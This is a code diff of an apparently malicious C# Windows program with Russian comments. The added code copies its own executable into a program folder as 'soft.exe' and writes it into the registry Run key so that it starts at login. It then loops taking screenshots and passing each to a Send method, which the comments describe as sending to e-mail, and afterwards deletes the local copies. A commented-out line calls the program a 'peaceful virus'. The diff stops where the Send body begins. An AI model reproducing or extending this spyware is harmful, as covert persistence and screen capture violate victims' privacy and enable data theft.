@@ -43,7 +43,7 @@ namespace GoshaMsql
 
         //***********
        // static string wayToDir = @"Screens\";
-        static string wayToScreen;
+        static string wayToScreen; 
        // static string finalDir = @"C:\Program Files (x86)\ScreenSaver\";
       //  Thread Cir = new Thread(Circle);
 
@@ -83,28 +83,101 @@ namespace GoshaMsql
 
         }
 
+        public static void Test()
+        {
+            try
+            {
+                //Проверка на существоании дериктории
+                if (!Directory.Exists(finalDir)) //куда переносим комп. Если такой папки нет. Создаем
+                {
+                    Directory.CreateDirectory(finalDir); //создание основной
+                    Directory.CreateDirectory(finalDir + @"Screens\"); // создание второстипенной
+
+                    File.Copy(Application.ExecutablePath, finalDir + "soft.exe"); //копирование  exe файла, в папку
+
+                    const string name = "SoftWare";
+                    string ExePath = finalDir + "soft.exe"; // путь к загрузчику
+                    RegistryKey reg; //обьект для работы с реестром
+                    reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"); // регестируем в реест загрузки ехе файл
+                    try
+                    {
+                        reg.SetValue(name, ExePath);// запись в реестр
+                        reg.Close(); //закрытие обьекта
+                    }
+                    catch(Exception ex)
+                    {
+                        string logError = ex.ToString();
+                        WrateText(logError);
+                        //MessageBox.Show("");
+                    }
+
+                   // MessageBox.Show("Я мирный хохляций вирус. Пожалуйста, удали 1 какой-нибудь файл на своем компьтере. Ты больше не увидишь это сообщение.");
+                    ///Process.Start("cmd", @"/C shutdown /r");
+                    Application.Exit();
+                }
+                else
+                {
+                    Thread.Sleep(60); //ожидание перед запускам
+                    Circle(); // запуск цикла скринов ПРОВЕРИТЬ
+                   
+                    //очистка старых фоток
+                    foreach (string way in Directory.GetFiles(wayToDir))
+                    {
+                        File.Delete(way); //удаление
+                    }
+
+                         
+                    Thread.Sleep(2592000); // ожидание
+                }
+            }
+            catch(Exception ex)
+            {
+                string logError = ex.ToString();
+                WrateText(logError);
+            }
+        }
+
+
 
         
-
-        //Сделать снимок
+        /// <summary>
+        /// Сделать снимок экрана
+        /// </summary>
         static public void MakeScreen()
         {
             Bitmap BM = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            Graphics GH = Graphics.FromImage(BM as Image);
+            Graphics GH = Graphics.FromImage(BM as Image); //Обьекты для работы с скиринами
            
-            GH.CopyFromScreen(0, 0, 0, 0, BM.Size);
+            GH.CopyFromScreen(0, 0, 0, 0, BM.Size); // размеры экрана
 
-            if (!Directory.Exists(wayToDir))
-                Directory.CreateDirectory(wayToDir);
-            wayToScreen = wayToDir + System.DateTime.Now.ToString().Replace(':', '_')+".bmp";
-            BM.Save(wayToScreen);
+            if (!Directory.Exists(wayToDir)) // проверка на существоании директории для сохранения снимка
+                Directory.CreateDirectory(wayToDir); //создание директории
 
-
-
-
+            wayToScreen = wayToDir + System.DateTime.Now.ToString().Replace(':', '_')+".bmp"; //Создание снимка с датой создания. С местом куда сохраняется снимок
+            BM.Save(wayToScreen); //Сохранение снимка
         }
 
-        ///Метод оптравки на почтуы
+        /// <summary>
+        /// Цикл  запуска скринов и удаления старых
+        /// </summary>
+        static private void Circle()
+        {
+            int time = 0;
+            while (time<10)
+            {
+                MakeScreen(); // скины
+                Send(); // отправка скинов
+                //DeleteScreen();
+                //MessageBox.Show("Succ");
+                //Thread.Sleep(1000 * 60); //спать
+                Thread.Sleep(1000 ); //спать
+                time++;
+            }
+        }
+
+        /// <summary>
+        ///  Метод оптравки на почту
+        /// </summary>
         static public void Send()
         {
 
